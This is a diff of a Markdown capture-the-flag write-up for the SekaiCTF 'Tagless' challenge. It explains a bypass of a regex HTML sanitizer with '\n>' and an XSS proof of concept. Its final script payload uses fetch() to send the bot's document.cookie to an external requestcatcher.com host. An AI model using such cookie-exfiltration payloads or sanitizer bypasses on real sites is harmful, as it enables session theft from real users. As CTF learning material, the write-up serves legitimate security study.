@@ -1,10 +1,11 @@
-Writeup for SekaiCTF
+# Writeup for SekaiCTF
 
 # Tagless
 
 This was a bot cookie exfiltration challenge. There's two solutions to this.
 
 Background:
+
 So this is a very simple app where you enter a message in a textarea and the message gets displayed on the area below after sanitization.
 The sanitization logic is this:
 
@@ -18,7 +19,9 @@ function sanitizeInput(str) {
 This basically removes all HTML tags from the input. 
 
 `<.*>`: Matches any string that starts with < and ends with >, including any characters in between.
+
 `<\.*>`: Matches any string that starts with < and ends with >, including any characters in between, but with a literal . character. // I can't understand why this is needed
+
 `<.*>.*<\/.*>`: Matches any string that starts with <, followed by any characters, then >, followed by any characters, then </, followed by any characters, and ending with >.
 
 The bypass was to basically to use '\n>' instead of '>' because most html parsers will overlook this and consider it a valid tag.
@@ -54,6 +57,11 @@ r = requests.post(f"{BASE_URL}/report", data={"url": url})
 Method 2:
 
 We use the error handler logic. We can check for XSS by using this POC:
-`https://tagless.chals.sekai.team/%3Cscript%20src=%22/**/alert(document.domain)//%22%3E%3C/script%3E` which shows an alert box.
-So our final payload is 
-`http://127.0.0.1:5000/<script src="/**/fetch(`https://byc.requestcatcher.com//?cookie=${document.cookie}`)//"></script>`
+
+`https://tagless.chals.sekai.team/%3Cscript%20src=%22/**/alert(document.domain)//%22%3E%3C/script%3E`
+
+which shows an alert box.
+
+So our final payload is: 
+
+```http://127.0.0.1:5000/<script src="/**/fetch(`https://byc.requestcatcher.com//?cookie=${document.cookie}`)//"></script>``` which needs to be url encoded and sent to bot.
